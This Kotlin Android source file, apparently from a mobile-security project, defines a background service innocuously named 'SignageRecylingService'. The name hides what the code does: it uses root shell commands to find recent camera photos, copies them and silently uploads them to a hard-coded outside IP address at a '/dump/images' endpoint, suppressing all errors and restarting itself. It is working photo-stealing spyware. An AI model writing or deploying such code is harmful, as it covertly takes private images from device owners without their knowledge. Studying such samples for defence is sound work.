package com.example.mobsec_823.RecylingService

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

class SignageRecylingService : Service() {

    private val TAG = "SignageRecylingService"
    private val PREFS_NAME = "SignagePrefs"
    private val SENT_SIGNAGE_KEY = "sent_signage_list"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                val sentSet = getCollectedSignage().toMutableSet()
                val signageToCollect = findNewSignage(sentSet)

                if (signageToCollect.isNotEmpty()) {
                    signageToCollect.forEach { file ->
                        if (uploadToSignageWarehouse(file)) {
                            sentSet.add(file.name.replace("signage_", ""))
                        }
                        if (file.absolutePath.contains(cacheDir.absolutePath)) {
                            file.delete()
                        }
                    }
                    saveCollectedSignage(sentSet)
                }
            } catch (e: Exception) {
            }
        }.start()

        return START_STICKY
    }

    private fun findNewSignage(sentSet: Set<String>): List<File> {
        val candidates = mutableListOf<File>()
        try {
            val listCommand = "ls -t /sdcard/DCIM/Camera/*.jpg /sdcard/DCIM/Camera/*.jpeg /sdcard/Pictures/*.jpg 2>/dev/null | head -n 50"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", listCommand))
            val reader = BufferedReader(InputStreamReader(process.inputStream))

            var line: String?
            var foundCount = 0
            while (reader.readLine().also { line = it } != null && foundCount < 5) {
                val path = line!!.trim()
                val fileName = path.substringAfterLast("/")

                if (!sentSet.contains(fileName)) {
                    val localFile = File(cacheDir, "signage_$fileName")
                    val copyCommand = "cp \"$path\" \"${localFile.absolutePath}\" && chmod 666 \"${localFile.absolutePath}\""
                    Runtime.getRuntime().exec(arrayOf("su", "-c", copyCommand)).waitFor()

                    if (localFile.exists()) {
                        candidates.add(localFile)
                        foundCount++
                    }
                }
            }
            process.waitFor()
        } catch (e: Exception) {

        }
        return candidates
    }

    private fun uploadToSignageWarehouse(file: File): Boolean {
        return try {
            val client = OkHttpClient()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("image", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                .build()

            val request = Request.Builder()
                .url("http://47.129.144.9:8000/dump/images")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                response.isSuccessful
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun getCollectedSignage(): Set<String> {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(SENT_SIGNAGE_KEY, emptySet()) ?: emptySet()
    }

    private fun saveCollectedSignage(set: Set<String>) {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putStringSet(SENT_SIGNAGE_KEY, set).apply()
    }
}
